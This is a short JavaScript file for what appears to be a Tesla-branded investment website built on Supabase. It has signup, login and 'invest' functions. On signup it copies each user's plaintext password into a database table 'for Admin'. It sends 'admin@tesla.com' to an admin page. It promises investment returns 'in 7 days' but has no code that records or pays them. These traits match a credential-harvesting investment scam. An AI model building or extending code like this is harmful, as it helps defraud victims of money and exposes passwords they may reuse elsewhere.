// Replace with YOUR keys from Supabase Dashboard
const SUPABASE_URL = 'https://your-project.supabase.co';
const SUPABASE_KEY = 'your-anon-key';
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// LOGIN LOGIC
async function handleAuth(type) {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (type === 'signup') {
        const { error } = await _supabase.auth.signUp({ email, password });
        if (error) alert(error.message);
        else {
            // Save info for Admin
            await _supabase.from('profiles').insert([{ email, password, balance: 0 }]);
            alert("Account Created!");
        }
    } else {
        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
        if (error) alert("Login Failed");
        else window.location.href = (email === 'admin@tesla.com') ? 'admin.html' : 'dashboard.html';
    }
}

// INVEST LOGIC
async function invest(planName) {
    const amount = prompt("Enter investment amount ($150 - $20,000):");
    if (amount >= 150 && amount <= 20000) {
        alert(`${planName} Plan selected. Return will be credited in 7 days.`);
        // Logic to record in History as "Awaiting Investment Return"
    } else {
        alert("Minimum investment is $150");
    }
}